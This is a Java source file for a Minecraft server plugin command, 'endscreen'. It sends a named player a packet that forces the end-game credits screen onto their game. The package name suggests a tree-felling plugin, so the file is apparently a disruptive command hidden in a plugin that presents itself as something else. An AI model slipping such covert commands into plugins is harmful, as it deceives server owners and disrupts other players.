package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.minecraft.server.v1_14_R1.PacketPlayOutGameStateChange;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.craftbukkit.v1_14_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.ArrayList;


public class EndScreen extends Command {
    public EndScreen() {
        super("endscreen", "What?! You defeated the enderdragon already?!", CommandCategory.Player, 1);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                return;
            }
            ((CraftPlayer) anotherPlayer).getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(4, 1));
            p.sendMessage(Start.Prefix + ChatColor.BLUE + anotherPlayer.getName() + " now has end screen!");
        } catch (Exception e) {
            Start.ErrorException(p, e);
        }
    }
}
